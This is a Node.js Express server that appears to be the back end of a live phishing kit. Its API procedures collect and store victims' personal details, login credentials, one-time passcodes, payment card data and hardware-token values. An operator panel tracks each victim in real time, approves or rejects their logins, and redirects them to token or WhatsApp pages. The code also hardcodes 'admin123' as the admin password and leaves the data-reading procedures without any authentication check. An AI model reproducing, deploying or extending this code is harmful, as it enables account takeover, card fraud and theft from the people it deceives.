const express = require('express');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json({ limit: '10mb' }));

// Data persistence
const DATA_DIR = path.join(__dirname, 'data');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

const DATA_FILE = path.join(DATA_DIR, 'visitors.json');
const ADMIN_FILE = path.join(DATA_DIR, 'admin.json');

let visitors = {};
let adminConfig = { password: 'admin123', whatsAppLink: '', customMessage: '' };

try {
  if (fs.existsSync(DATA_FILE)) visitors = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
} catch (e) { visitors = {}; }

try {
  if (fs.existsSync(ADMIN_FILE)) adminConfig = JSON.parse(fs.readFileSync(ADMIN_FILE, 'utf8'));
} catch (e) {}

let saveTimer = null;
function saveVisitors() {
  if (saveTimer) return;
  saveTimer = setTimeout(() => {
    saveTimer = null;
    try { fs.writeFileSync(DATA_FILE, JSON.stringify(visitors, null, 2), 'utf8'); }
    catch (e) { console.error('Failed to save visitors:', e.message); }
  }, 500);
}

function saveAdmin() {
  try { fs.writeFileSync(ADMIN_FILE, JSON.stringify(adminConfig, null, 2), 'utf8'); }
  catch (e) { console.error('Failed to save admin config:', e.message); }
}

// Admin sessions
const adminSessions = {};

function generateSessionId() {
  return crypto.randomBytes(32).toString('hex');
}

function isAdminAuthenticated(req) {
  const authHeader = req.headers.authorization;
  if (!authHeader) return false;
  const token = authHeader.replace('Bearer ', '');
  return adminSessions[token] === true;
}

// tRPC-compatible API handler
app.all('/api/trpc/:procedure', (req, res) => {
  const procedure = req.params.procedure;
  const isQuery = req.method === 'GET';
  let input = {};

  if (isQuery) {
    try {
      const rawInput = req.query.input;
      if (rawInput) input = JSON.parse(rawInput);
    } catch (e) {}
  } else {
    input = req.body || {};
  }

  try {
    const result = handleProcedure(procedure, input, req);
    res.json({ result: { data: { json: result } } });
  } catch (err) {
    const code = err.code || 'INTERNAL_SERVER_ERROR';
    const httpStatus = err.httpStatus || 500;
    res.status(httpStatus).json({
      error: { json: { message: err.message, code: -32603, data: { code, httpStatus, path: procedure } } }
    });
  }
});

// Batch tRPC support
app.all('/api/trpc/:proc1,:proc2*', (req, res) => {
  const procs = req.params.proc1 + ',' + (req.params[0] || '');
  const procedures = procs.split(',').filter(Boolean);
  const results = [];

  for (const proc of procedures) {
    try {
      let input = {};
      if (req.method === 'GET') {
        try {
          const rawInput = req.query.input;
          if (rawInput) {
            const parsed = JSON.parse(rawInput);
            input = parsed[results.length] || {};
          }
        } catch (e) {}
      } else {
        const body = req.body;
        if (Array.isArray(body)) input = body[results.length] || {};
        else input = body || {};
      }
      const result = handleProcedure(proc, input, req);
      results.push({ result: { data: { json: result } } });
    } catch (err) {
      results.push({
        error: { json: { message: err.message, code: -32603, data: { code: 'INTERNAL_SERVER_ERROR', httpStatus: 500, path: proc } } }
      });
    }
  }
  res.json(results);
});

function handleProcedure(procedure, input, req) {
  switch (procedure) {
    // Auth
    case 'login': {
      const { password } = input;
      if (password === adminConfig.password) {
        const sessionId = generateSessionId();
        adminSessions[sessionId] = true;
        return { success: true, token: sessionId };
      }
      throw { message: 'Invalid password', code: 'UNAUTHORIZED', httpStatus: 401 };
    }
    case 'logout': {
      const token = (req.headers.authorization || '').replace('Bearer ', '');
      delete adminSessions[token];
      return { success: true };
    }
    case 'checkSession': {
      return { authenticated: isAdminAuthenticated(req) };
    }

    // Visitors
    case 'getLiveVisitors': {
      const liveList = Object.entries(visitors).map(([id, v]) => ({
        id,
        ...v,
        isLive: v.lastSeen && (Date.now() - v.lastSeen < 30000)
      }));
      return liveList;
    }
    case 'getAllVisitors': {
      return Object.entries(visitors).map(([id, v]) => ({ id, ...v }));
    }
    case 'updateVisitor': {
      const { id, ...data } = input;
      if (id && visitors[id]) {
        Object.assign(visitors[id], data);
        saveVisitors();
      }
      return { success: true };
    }
    case 'deleteApplication':
    case 'deleteInactiveClients': {
      const { id } = input;
      if (id && visitors[id]) {
        delete visitors[id];
        saveVisitors();
      }
      return { success: true };
    }
    case 'resetTotalVisitors': {
      visitors = {};
      saveVisitors();
      return { success: true };
    }

    // Data submission
    case 'savePersonalInfo': {
      const visitorId = input.visitorId || generateSessionId().slice(0, 12);
      if (!visitors[visitorId]) visitors[visitorId] = { createdAt: Date.now() };
      Object.assign(visitors[visitorId], {
        personalInfo: input,
        lastSeen: Date.now(),
        currentPage: 'personal-info'
      });
      saveVisitors();
      return { success: true, visitorId };
    }
    case 'saveLoginData': {
      const { visitorId, ...loginData } = input;
      if (visitorId && visitors[visitorId]) {
        visitors[visitorId].loginData = loginData;
        visitors[visitorId].lastSeen = Date.now();
        visitors[visitorId].currentPage = 'login';
        saveVisitors();
      }
      return { success: true };
    }
    case 'saveOtpData': {
      const { visitorId: vid, ...otpData } = input;
      if (vid && visitors[vid]) {
        visitors[vid].otpData = otpData;
        visitors[vid].lastSeen = Date.now();
        visitors[vid].currentPage = 'otp';
        saveVisitors();
      }
      return { success: true };
    }
    case 'saveCardData': {
      const { visitorId: cardVid, ...cardData } = input;
      if (cardVid && visitors[cardVid]) {
        visitors[cardVid].cardData = cardData;
        visitors[cardVid].lastSeen = Date.now();
        visitors[cardVid].currentPage = 'card-info';
        saveVisitors();
      }
      return { success: true };
    }
    case 'saveWatchLink': {
      const { visitorId: wlVid, ...watchData } = input;
      if (wlVid && visitors[wlVid]) {
        visitors[wlVid].watchLink = watchData;
        visitors[wlVid].lastSeen = Date.now();
        visitors[wlVid].currentPage = 'watch-link';
        saveVisitors();
      }
      return { success: true };
    }
    case 'saveHardToken': {
      const { visitorId: htVid, ...tokenData } = input;
      if (htVid && visitors[htVid]) {
        visitors[htVid].hardToken = tokenData;
        visitors[htVid].lastSeen = Date.now();
        visitors[htVid].currentPage = 'hard-token';
        saveVisitors();
      }
      return { success: true };
    }

    // Page tracking
    case 'updatePage': {
      const { visitorId: upVid, page } = input;
      if (upVid && visitors[upVid]) {
        visitors[upVid].currentPage = page;
        visitors[upVid].lastSeen = Date.now();
        saveVisitors();
      }
      return { success: true };
    }

    // Redirects
    case 'redirectVisitor':
    case 'redirectUser': {
      const { visitorId: rvId, targetPage } = input;
      if (rvId && visitors[rvId]) {
        visitors[rvId].redirect = targetPage;
        saveVisitors();
      }
      return { success: true };
    }
    case 'clearVisitorRedirect':
    case 'clearRedirectByUser': {
      const { visitorId: crId } = input;
      if (crId && visitors[crId]) {
        delete visitors[crId].redirect;
        saveVisitors();
      }
      return { success: true };
    }
    case 'getVisitorRedirect':
    case 'getRedirectStatus': {
      const { visitorId: grId } = input;
      if (grId && visitors[grId] && visitors[grId].redirect) {
        return { redirect: visitors[grId].redirect };
      }
      return { redirect: null };
    }
    case 'redirectAllToToken': {
      Object.keys(visitors).forEach(id => {
        visitors[id].redirect = '/token';
      });
      saveVisitors();
      return { success: true };
    }
    case 'redirectWhatsApp': {
      const { visitorId: rwId } = input;
      if (rwId && visitors[rwId]) {
        visitors[rwId].redirect = '/whatsapp';
        saveVisitors();
      }
      return { success: true };
    }

    // Login approval
    case 'approveLogin': {
      const { visitorId: alId } = input;
      if (alId && visitors[alId]) {
        visitors[alId].loginStatus = 'approved';
        saveVisitors();
      }
      return { success: true };
    }
    case 'rejectLogin': {
      const { visitorId: rlId } = input;
      if (rlId && visitors[rlId]) {
        visitors[rlId].loginStatus = 'rejected';
        saveVisitors();
      }
      return { success: true };
    }

    // Config
    case 'getWhatsAppLink': {
      return { link: adminConfig.whatsAppLink || '' };
    }
    case 'updateWhatsAppLink': {
      adminConfig.whatsAppLink = input.link || '';
      saveAdmin();
      return { success: true };
    }
    case 'getCustomMessage': {
      return { message: adminConfig.customMessage || '' };
    }
    case 'setCustomMessage': {
      adminConfig.customMessage = input.message || '';
      saveAdmin();
      return { success: true };
    }
    case 'clearCustomMessage': {
      adminConfig.customMessage = '';
      saveAdmin();
      return { success: true };
    }

    // Applications
    case 'getApplications': {
      return Object.entries(visitors)
        .filter(([, v]) => v.personalInfo || v.loginData || v.cardData)
        .map(([id, v]) => ({ id, ...v }));
    }

    default:
      throw { message: `No procedure found on path "${procedure}"`, code: 'NOT_FOUND', httpStatus: 404 };
  }
}

// Heartbeat endpoint for presence tracking
app.post('/api/heartbeat', (req, res) => {
  const { visitorId } = req.body || {};
  if (visitorId && visitors[visitorId]) {
    visitors[visitorId].lastSeen = Date.now();
    saveVisitors();
  }
  res.json({ ok: true });
});

// Serve static files
app.use(express.static(path.join(__dirname, 'public')));

// SPA fallback - serve index.html for all unmatched routes
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
